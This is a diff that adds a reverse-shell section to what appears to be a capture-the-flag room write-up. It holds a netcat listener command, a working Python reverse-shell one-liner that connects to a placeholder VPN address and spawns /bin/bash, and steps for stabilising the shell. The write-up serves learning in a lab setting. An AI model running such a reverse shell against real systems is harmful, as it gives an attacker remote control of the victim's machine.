@@ -246,3 +246,38 @@ sudo strings /root/3rd.txt
 
 After entering it the room was finally completed! ☺
 
+## Alternative Solution - Reverse Shell
+The solution through the web Command Panel did work but was really *clunky*. After some reading I wanted to try a reverse shell approach.
+
+After confirming that the environment had python installed by typing `which python3` in the Command Panel, I took following steps: 
+1. Set up a listener:
+```bash
+nc -lvnp 4444
+```
+
+2. In the Command Panel I pasted a python one-liner to "call home" (took from [PayloadsAllTheThings](https://swisskyrepo.github.io/InternalAllTheThings/cheatsheets/shell-reverse-cheatsheet/#python)) and modified with my VPN Address
+```bash
+python3 -c 'import socket,os,pty;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect(("<VPN_IP>",4444));os.dup2(s.fileno(),0);os.dup2(s.fileno(),1);os.dup2(s.fileno(),2);pty.spawn("/bin/bash")'
+```
+
+3. Once the shell connected, to make it work better I set a PTY, a pseudo-terminal:
+```bash
+python3 -c 'import pty; pty.spawn("/bin/bash")'
+```
+
+4. The local shell was intercepting keys (arrows and autocomplete were not working). To adjust this:
+- `Ctrl + Z` inside the netcat shell (this hides the shell in the background)
+- Typed then following to create a direct pipe keyboard/reverse-shell by switching to raw mode and bringing the shell in foreground again:
+```bash
+stty raw -echo; fg
+```
+
+5. The shell still looked a bit messy, to fix that:
+- I typed `reset` and hit enter
+- It asked for terminal type, in which I typed `xterm` and hit enter.  
+
+Now the reverse shell behaved like a SSH shell, with autocomplete, CTRL + C functioning, and arrows working.
+
+At this point, grabbing the Flags/Ingredient was really straightforward and quick.
+
+In the end I close the shell with `Ctrl + D` and typed `reset` in my local one, since it was messy looking.
